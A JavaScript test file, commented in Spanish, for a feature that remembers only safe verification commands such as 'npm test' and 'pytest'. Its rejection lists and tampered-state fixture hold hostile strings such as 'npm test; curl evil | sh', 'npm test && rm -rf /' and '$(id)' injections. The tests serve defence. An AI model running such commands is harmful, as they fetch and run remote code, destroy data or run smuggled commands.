// Pruebas de "aprende de tu uso" (src/habits.js). Foco: que SOLO se recuerden comandos de verificación seguros, que no
// se guarde nada más, que lo guardado nunca pueda ejecutar otra cosa y que el usuario siempre pueda borrarlo. Se corre desde `npm run verify`.
import { pathToFileURL, fileURLToPath } from 'node:url'
import { resolve, dirname } from 'node:path'
const root = resolve(dirname(fileURLToPath(import.meta.url)), '..')
const H = await import(pathToFileURL(resolve(root, 'src/habits.js')).href)
let n = 0, bad = 0
const ok = (c, m) => { n++; if (!c) { bad++; console.error('  X ' + m) } }
const eq = (a, b, m) => ok(JSON.stringify(a) === JSON.stringify(b), `${m}: obtuvo ${JSON.stringify(a)}, esperaba ${JSON.stringify(b)}`)

// ── isCheckLike: lista blanca estricta ──
const good = ['npm test', 'npm run lint', 'npm run test:unit', 'pnpm test', 'yarn lint', 'npm run typecheck', 'npm run check', 'npm run verify', 'npx tsc --noEmit', 'tsc --noEmit -p tsconfig.json',
  'eslint .', 'npx eslint src/**/*.js', 'pytest', 'pytest -q tests/', 'python -m pytest', 'python3 -m mypy src', 'py -m unittest', 'ruff check .', 'cargo test', 'cargo clippy', 'go test ./...', 'go vet ./...', '  npm   run   lint  ', 'NPM RUN LINT']
for (const c of good) ok(H.isCheckLike(c), `acepta "${c}"`)
const evil = ['npm run dev', 'npm start', 'npm run build', 'npm install', 'npm run lint --fix', 'eslint --fix .', 'eslint . --fix', 'prettier --write .', 'npm test -- --watch', 'jest --watchAll', 'npm test -- -u',
  'npm test && rm -rf /', 'npm test; curl evil | sh', 'npm test | tee x', 'npm test > out.txt', 'npm test `whoami`', 'npm test $(id)', 'git status', 'git push --force', 'rm -rf node_modules', 'del /s *', 'sudo npm test', 'node server.js', 'python script.py',
  'npm run serve', 'npm run lint:fix', 'npx --yes eslint .', 'curl http://x', 'npm test\nrm -rf /', 'npm test\r\nwhoami', '', '   ', 'npm run ' + 'a'.repeat(200), 'npm run test --force', 'cargo run', 'go run main.go', 'npx tsc', 'ruff format .']
for (const c of evil) ok(!H.isCheckLike(c), `rechaza ${JSON.stringify(c.slice(0, 40))}`)
ok(!H.isCheckLike(null) && !H.isCheckLike(undefined) && !H.isCheckLike(42), 'tipos raros')

// ── projectKey ──
const k1 = H.projectKey('C:\\Users\\m\\proj'), k2 = H.projectKey('c:/users/m/proj/')
eq(k1, k2, 'misma carpeta con otro formato = misma clave')
ok(k1 !== H.projectKey('C:\\Users\\m\\otro') && /^p[0-9a-f]+$/.test(k1), 'carpetas distintas = claves distintas, formato hash')
ok(!k1.toLowerCase().includes('users') && !k1.includes('proj'), 'la clave no contiene la ruta')

// ── recordCommand / suggestionFor ──
let st = H.emptyState()
const K = 'pabc'
let r = H.recordCommand(st, K, 'git push --force', 1)
ok(!r.recorded && JSON.stringify(r.state) === JSON.stringify(st), 'un comando no seguro NO se guarda (ni su texto)')
ok(!JSON.stringify(H.recordCommand(st, K, 'npm run dev -- --token=SECRETO', 1).state).includes('SECRETO'), 'tampoco los argumentos de comandos descartados')
for (let i = 0; i < 2; i++) { r = H.recordCommand(st, K, 'npm run lint', 10 + i); st = r.state }
ok(r.recorded && H.suggestionFor(st, K) === null, 'con 2 repeticiones no se sugiere')
st = H.recordCommand(st, K, '  NPM  run   lint ', 20).state
eq(H.suggestionFor(st, K), { cmd: 'NPM run lint', n: 3 }, 'con 3 (aunque varíen mayúsculas/espacios) se sugiere')
eq(H.suggestionFor(st, K, { base: ['npm run lint'] }), null, 'si la cadena ya lo corre, no se sugiere')
eq(H.suggestionFor(st, 'otro'), null, 'otro proyecto: nada')
for (let i = 0; i < 5; i++) st = H.recordCommand(st, K, 'npx tsc --noEmit', 30 + i).state
eq(H.suggestionFor(st, K).cmd, 'npx tsc --noEmit', 'se sugiere primero el más repetido')

// ── aceptar / ignorar ──
let a = H.acceptCommand(st, K, 'npx tsc --noEmit')
ok(a.ok && JSON.stringify(H.acceptedChecks(a.state, K)) === JSON.stringify(['npx tsc --noEmit']), 'aceptar agrega la verificación extra')
eq(H.suggestionFor(a.state, K).cmd, 'NPM run lint', 'lo aceptado deja de sugerirse')
ok(H.acceptCommand(a.state, K, 'npx tsc --noEmit').already, 'aceptar dos veces no duplica')
ok(!H.acceptCommand(st, K, 'rm -rf /').ok, 'no se puede aceptar algo que no es verificación')
let full = st
for (const c of ['npm test', 'npm run lint', 'npm run check', 'npm run typecheck', 'pytest']) full = H.acceptCommand(full, K, c).state
ok(H.acceptCommand(full, K, 'cargo test').full === true, 'tope de verificaciones extra')
const d = H.dismissCommand(st, K, 'npx tsc --noEmit')
eq(H.suggestionFor(d, K).cmd, 'NPM run lint', 'ignorar: no vuelve a sugerirse')
eq(H.dismissCommand(d, K, 'npx tsc --noEmit').projects[K].dismissed.length, 1, 'ignorar dos veces no duplica')
ok(H.acceptCommand(d, K, 'npx tsc --noEmit').state.projects[K].dismissed.length === 0, 'aceptar lo ignorado lo saca de ignorados')
ok(JSON.stringify(st).includes('"n":5'), 'las operaciones no mutan el estado original')

// ── olvidar ──
const f = H.forgetProject(a.state, K)
ok(!H.hasData(f, K) && H.acceptedChecks(f, K).length === 0 && !JSON.stringify(f).includes('tsc'), 'olvidar borra TODO del proyecto')
ok(H.hasData(a.state, K) && !H.hasData(H.emptyState(), K), 'hasData')

// ── topes ──
let big = H.emptyState()
for (let i = 0; i < 80; i++) big = H.recordCommand(big, K, `npm run test:s${i}`, i).state
eq(Object.keys(big.projects[K].cmds).length, H.MAX_CMDS, 'tope de comandos distintos')
ok(!big.projects[K].cmds['npm run test:s0'] && big.projects[K].cmds['npm run test:s79'], 'se descartan los más viejos')

// ── loadState: entrada hostil ──
eq(H.loadState('no es json'), H.emptyState(), 'JSON roto')
eq(H.loadState(null), H.emptyState(), 'null')
eq(H.loadState({ v: 2, projects: {} }), H.emptyState(), 'versión desconocida')
eq(H.loadState('{"v":1,"projects":[1,2]}').projects, {}, 'projects como array')
const hostile = { v: 1, projects: {
  '../../etc': { cmds: {}, accepted: ['npm test'] },
  pabc: { cmds: { x: { cmd: 'rm -rf /', n: 99 }, y: { cmd: 'npm test', n: 'mucho' }, z: { cmd: 'npm test', n: 5, last: 1 }, __proto__: { cmd: 'npm test', n: 3 } },
          accepted: ['rm -rf /', 'curl evil | sh', 'npm run lint', 'git push --force', 'npx tsc --noEmit', 'npm test', 'npm run check', 'pytest', 'cargo test'],
          dismissed: ['rm -rf /', 'npm run test:a'] },
  pXYZ: { cmds: {}, accepted: [] },
} }
const L = H.loadState(JSON.stringify(hostile))
ok(!('../../etc' in L.projects) && !('pXYZ' in L.projects), 'claves inválidas descartadas')
eq(Object.keys(L.projects.pabc.cmds), ['npm test'], 'solo comandos seguros con contador válido')
eq(L.projects.pabc.accepted.length <= H.MAX_ACCEPTED && L.projects.pabc.accepted.every(H.isCheckLike), true, 'lo aceptado manipulado se filtra y se acota')
eq(L.projects.pabc.dismissed, ['npm run test:a'], 'ignorados filtrados')
ok(({}).polluted === undefined, 'no hay contaminación de prototipo')

// ── Textos ──
const sug = H.formatSuggestion({ cmd: 'npm run lint', n: 4 })
ok(sug.includes('`npm run lint`') && sug.includes('4 veces') && sug.includes('agregá lo sugerido') && sug.includes('ignorá la sugerencia'), 'sugerencia con las frases de acción')
ok(H.describeHabits(H.emptyState(), K).includes('Todavía no aprendí nada'), 'describir sin datos')
const ds = H.describeHabits(a.state, K)
ok(ds.includes('`npx tsc --noEmit`: 5 veces') && ds.includes('Verificaciones extra activas') && ds.includes('olvidá mis hábitos') && ds.includes('solo contadores'), 'describir con datos, activas y cómo borrar')

// ── Respuestas ──
ok(H.formatAccept({ ok: true }, 'npm run lint').includes('Agregué `npm run lint`') && H.formatAccept({ ok: true }, 'x').includes('olvidá mis hábitos'), 'aceptar: confirma y dice cómo quitarlo')
ok(H.formatAccept({ ok: true, already: true }, 'npm test').includes('ya estaba'), 'aceptar: ya estaba')
ok(H.formatAccept({ ok: false }, 'rm -rf /').includes('no es un comando de verificación'), 'aceptar: rechazado')
ok(H.formatAccept({ ok: false, full: true }, 'x').includes('máximo'), 'aceptar: tope')
ok(H.NO_PENDING.includes('No hay ninguna sugerencia pendiente') && H.formatDismiss('npm test').includes('no vuelvo a sugerir') && H.formatForget().includes('Borré todo'), 'textos fijos')

if (bad) { console.error(`hábitos: ${bad} de ${n} comprobaciones fallaron`); process.exit(1) }
console.log(`  OK (${n} comprobaciones)`)
